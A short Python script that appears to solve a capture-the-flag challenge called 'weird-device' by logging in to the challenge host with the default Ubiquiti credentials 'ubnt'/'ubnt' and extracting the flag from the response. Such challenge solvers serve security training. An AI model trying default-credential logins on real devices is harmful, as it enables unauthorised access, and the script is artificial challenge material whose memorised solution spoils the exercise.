import os, requests, re

URL = os.environ.get("URL", "http://weird-device.challs.olicyber.it")
if URL.endswith("/"):
    URL = URL[:-1]
data = {"username": "ubnt", "password": "ubnt"}
r = requests.post(URL, data=data)

try:
    pattern = r'flag\{.*?\}'
    flag = re.findall(pattern, r.text)[0]
except:
    flag = "Not found"

print(flag)
